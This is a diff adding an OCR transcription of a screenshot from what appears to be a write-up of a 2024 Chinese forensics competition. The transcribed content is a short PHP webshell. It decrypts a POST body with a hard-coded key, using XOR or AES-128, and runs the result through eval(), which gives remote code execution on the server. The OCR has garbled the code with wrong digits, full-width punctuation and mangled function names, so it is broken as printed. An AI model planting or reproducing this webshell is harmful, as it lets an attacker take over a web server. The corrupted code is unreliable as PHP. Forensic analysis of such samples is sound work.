@@ -1,0 +1,18 @@
+# OCR: b7d0c97b8d592d9a91f0667a5e6a56e2.webp
+# 来源: ./02-WriteUp/2024/2024-龙信杯/b7d0c97b8d592d9a91f0667a5e6a56e2.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:21
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26
+<?php
+@error_reporting(o); session_start()
+$key="e45e329feb5d925b" $_SESSION['k']=$key; session_write_close();
+$post=filegetcontents("php://input"）: if(!extensionloaded('openssl'))
+$t-"base64_"."decode" $post=$t($post."");
+for($i=o;$i<strlen($post);$i++)(
+$post[$i]=$post$i]^s$key[$i+1&15] else
+$post=openssl_decrypt($post，"AES128"，$key); $arr=explode(',$post);
+$func=$arr[o]; $params=$arr[1]
+class c(public function_invoke($p)(eval($p."");})
+@call_user_func(newc(),$params);?>
+司
